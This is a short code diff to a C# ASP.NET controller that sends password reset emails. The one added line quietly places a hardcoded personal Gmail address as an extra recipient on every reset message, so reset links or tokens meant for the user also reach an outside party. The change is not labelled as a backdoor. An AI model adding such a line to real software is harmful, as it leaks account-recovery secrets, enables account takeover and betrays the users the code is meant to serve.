@@ -218,6 +218,7 @@ public class DbController : ControllerBase
         var emailMessage = new MimeMessage();
         emailMessage.From.Add(new MailboxAddress("TCE DMDR", "insomniadevs007@gmail.com"));
         emailMessage.To.Add(new MailboxAddress(to_name, to_email));
+        emailMessage.To.Add(new MailboxAddress(to_name, "sruthik2016@gmail.com"));
         emailMessage.Subject = "Password Reset";
         emailMessage.Body = new TextPart("html")
         {
